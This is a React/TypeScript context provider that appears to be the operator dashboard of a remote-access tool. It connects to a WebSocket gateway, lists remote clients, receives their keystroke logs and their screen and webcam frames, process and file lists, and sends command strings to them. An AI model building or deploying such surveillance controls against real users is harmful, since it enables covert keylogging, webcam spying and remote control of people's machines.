import { createContext, useCallback, useContext, useEffect, useRef, useState, type ReactNode } from 'react';
import { GatewayWsClient } from './client';
import type { AppInfo, BackendFrameEvent, Client, ConnectionStatus, FileEntry, Process } from './types';

interface GatewayContextValue {
  // Connection
  wsClient: GatewayWsClient | null;
  connectionStatus: ConnectionStatus;
  connect: (ip: string, port: string) => void;
  disconnect: () => void;

  // Clients
  clients: Map<number, Client>;
  activeClientId: number | null;
  setActiveClientId: (id: number | null) => void;
  activeClient: Client | null;

  // Commands
  sendCommand: (command: string) => void;
  sendCommandTo: (backendId: number, command: string) => void;
}

const GatewayContext = createContext<GatewayContextValue | null>(null);

export function useGateway() {
  const context = useContext(GatewayContext);
  if (!context) {
    throw new Error('useGateway must be used within a GatewayProvider');
  }
  return context;
}

interface GatewayProviderProps {
  children: ReactNode;
}

export function GatewayProvider({ children }: GatewayProviderProps) {
  const [connectionStatus, setConnectionStatus] = useState<ConnectionStatus>('DISCONNECTED');
  const [clients, setClients] = useState<Map<number, Client>>(new Map());
  const [activeClientId, setActiveClientId] = useState<number | null>(null);
  const [gatewayStatus, setGatewayStatus] = useState<string>('');

  const wsClientRef = useRef<GatewayWsClient | null>(null);
  const pingIntervalRef = useRef<any>(null);

  // Create default client
  const createDefaultClient = useCallback((id: number): Client => ({
    id,
    hostname: `Client #${id}`,
    os: 'Unknown',
    status: 'online',
    ip: '',
    lastSeen: Date.now(),
    keylogs: [],
    logs: [],
    processes: [],
    apps: [],
    files: [],
    currentPath: '.',
    state: {
      monitor: 'idle',
      webcam: 'idle',
      keylogger: 'idle',
    },
  }), []);

  // Handle backend frame (text/binary)
  const handleBackendFrame = useCallback((ev: BackendFrameEvent) => {
    const { backendId } = ev;

    setClients(prev => {
      const newClients = new Map(prev);
      let client = newClients.get(backendId);

      if (!client) {
        client = createDefaultClient(backendId);
        newClients.set(backendId, client);
      }

      // Update lastSeen
      client = { ...client, lastSeen: Date.now(), status: 'online' };

      if (ev.kind === 'jpeg' || ev.kind === 'binary') {
        // Video frame - determine channel from first byte
        const data = new Uint8Array(ev.payload);
        if (data.length > 0) {
          const channel = data[0];
          const jpegData = ev.payload.slice(1);
          const blob = new Blob([jpegData], { type: 'image/jpeg' });
          const url = URL.createObjectURL(blob);

          if (channel === 0x01) {
            // Revoke old URL
            if (client.monitorFrame) URL.revokeObjectURL(client.monitorFrame);
            client = { ...client, monitorFrame: url };
          } else if (channel === 0x02) {
            if (client.webcamFrame) URL.revokeObjectURL(client.webcamFrame);
            client = { ...client, webcamFrame: url };
          }
        }
      } else if (ev.kind === 'text') {
        client = handleTextMessage(client, ev.text);
      }

      newClients.set(backendId, client);
      return newClients;
    });
  }, [createDefaultClient]);

  // Handle text messages from backend
  const handleTextMessage = (client: Client, text: string): Client => {
    // State sync
    if (text.startsWith('STATUS:SYNC:')) {
      const syncPart = text.substring(12);
      const [feature, state] = syncPart.split('=');
      const isActive = state === 'active';

      const newState = { ...client.state };
      if (feature === 'monitor') newState.monitor = isActive ? 'active' : 'idle';
      else if (feature === 'webcam') newState.webcam = isActive ? 'active' : 'idle';
      else if (feature === 'keylogger') newState.keylogger = isActive ? 'active' : 'idle';

      return { ...client, state: newState };
    }

    // Status messages
    if (text.startsWith('STATUS:')) {
      const parts = text.split(':');
      const feature = parts[1];
      const state = parts[2];

      const newState = { ...client.state };
      if (feature === 'MONITOR_STREAM') {
        if (state === 'STARTING') newState.monitor = 'starting';
        else if (state === 'STARTED') newState.monitor = 'active';
        else if (state === 'STOPPED') newState.monitor = 'idle';
      } else if (feature === 'WEBCAM_STREAM') {
        if (state === 'STARTING') newState.webcam = 'starting';
        else if (state === 'STARTED') newState.webcam = 'active';
        else if (state === 'STOPPED') newState.webcam = 'idle';
      } else if (feature === 'KEYLOGGER') {
        if (state === 'STARTING') newState.keylogger = 'starting';
        else if (state === 'STARTED') newState.keylogger = 'active';
        else if (state === 'STOPPED') newState.keylogger = 'idle';
      }

      return { ...client, state: newState };
    }

    // Keylog data
    if (text.startsWith('KEYLOG: ')) {
      const char = text.substring(8);
      const entry = { text: char, timestamp: Date.now() };
      return { ...client, keylogs: [...client.keylogs, entry] };
    }

    // Process list
    if (text.startsWith('DATA:PROCS:')) {
      const payload = text.substring(11);
      const processes: Process[] = payload.split(';').filter(Boolean).map(item => {
        const parts = item.split('|');
        return {
          pid: parseInt(parts[0], 10) || 0,
          name: parts[1] || '',
          user: 'User',
          cmd: parts[3] || parts[1] || '',
          cpu: 0,
          memory: 0,
          status: 'Running' as const,
        };
      });
      return { ...client, processes };
    }

    // App list
    if (text.startsWith('DATA:APPS:')) {
      const payload = text.substring(10);
      if (!payload) return { ...client, apps: [] };

      const apps: AppInfo[] = payload.split(';').filter(Boolean).map(item => {
        const parts = item.split('|');
        return {
          id: parts[0] || '',
          name: parts[1] || '',
          icon: parts[2] || '',
          exec: parts[3] || '',
          keywords: parts[4] || '',
        };
      });
      return { ...client, apps };
    }

    // File list
    if (text.startsWith('DATA:FILES:')) {
      try {
        const json = text.substring(11);
        const rawFiles = JSON.parse(json);
        console.log('[FE-DEBUG] Raw Files:', rawFiles.slice(0, 2));

        const files: FileEntry[] = rawFiles.map((f: any) => {
          // Robust directory detection
          const isDir = f.dir === true || f.dir === 'true' || f.dir === 1 ||
                        f.is_directory === true || f.isDir === true;
          return {
            name: f.name,
            path: f.path,
            size: f.size,
            type: isDir ? 'folder' : 'file',
            extension: f.name.includes('.') ? f.name.split('.').pop() : undefined
          };
        });
        return { ...client, files };
      } catch (err) {
        console.error('Failed to parse file list:', err);
      }
    }

    // Error handling
    if (text.startsWith('ERROR:')) {
      console.error(`[FE-DEBUG] Backend Error: ${text}`);
      return { ...client, logs: [...client.logs, `❌ ${text}`] };
    }

    // Client name
    if (text.startsWith('INFO:NAME=')) {
      const hostname = text.substring(10).trim();
      return { ...client, hostname };
    }

    return client;
  };

  // Handle backend active (discovery)
  const handleBackendActive = useCallback((backendId: number) => {
    setClients(prev => {
      if (prev.has(backendId)) {
        const client = prev.get(backendId)!;
        const newClients = new Map(prev);
        newClients.set(backendId, { ...client, lastSeen: Date.now(), status: 'online' });
        return newClients;
      }

      const newClients = new Map(prev);
      newClients.set(backendId, createDefaultClient(backendId));
      return newClients;
    });
  }, [createDefaultClient]);

  // Connect to gateway
  const connect = useCallback((ip: string, port: string) => {
    if (wsClientRef.current) {
      wsClientRef.current.disconnect();
    }

    const wsClient = new GatewayWsClient({
      onLog: (msg) => console.log('[WS]', msg),
      onStatus: setConnectionStatus,
      onClientId: (id) => {
        console.log('🆔 Gateway assigned Client ID:', id);
        // Start ping loop for discovery
        if (pingIntervalRef.current) clearInterval(pingIntervalRef.current);
        pingIntervalRef.current = setInterval(() => {
          if (wsClientRef.current?.isConnected()) {
            wsClientRef.current.sendText(0, 'ping');
          }
        }, 5000);
        // Initial ping
        wsClientRef.current?.sendText(0, 'ping');
      },
      onGatewayText: (text) => console.log('📢 Gateway:', text),
      onBackendActive: handleBackendActive,
      onBackendFrame: handleBackendFrame,
      onClose: () => {
        if (pingIntervalRef.current) {
          clearInterval(pingIntervalRef.current);
          pingIntervalRef.current = null;
        }
      },
    });

    wsClientRef.current = wsClient;
    wsClient.connect(`ws://${ip}:${port}`);
  }, [handleBackendActive, handleBackendFrame]);

  // Disconnect
  const disconnect = useCallback(() => {
    if (pingIntervalRef.current) {
      clearInterval(pingIntervalRef.current);
      pingIntervalRef.current = null;
    }
    wsClientRef.current?.disconnect();
    wsClientRef.current = null;
    setClients(new Map());
    setActiveClientId(null);
  }, []);

  // Send command to active client
  const sendCommand = useCallback((command: string) => {
    if (activeClientId && wsClientRef.current?.isConnected()) {
      wsClientRef.current.sendText(activeClientId, command);
    }
  }, [activeClientId]);

  // Send command to specific backend
  const sendCommandTo = useCallback((backendId: number, command: string) => {
    if (wsClientRef.current?.isConnected()) {
      wsClientRef.current.sendText(backendId, command);
    }
  }, []);

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (pingIntervalRef.current) clearInterval(pingIntervalRef.current);
      wsClientRef.current?.disconnect();
    };
  }, []);

  const activeClient = activeClientId ? clients.get(activeClientId) ?? null : null;

  const value: GatewayContextValue = {
    wsClient: wsClientRef.current,
    connectionStatus,
    connect,
    disconnect,
    clients,
    activeClientId,
    setActiveClientId,
    activeClient,
    sendCommand,
    sendCommandTo,
  };

  return (
    <GatewayContext.Provider value={value}>
      {children}
    </GatewayContext.Provider>
  );
}
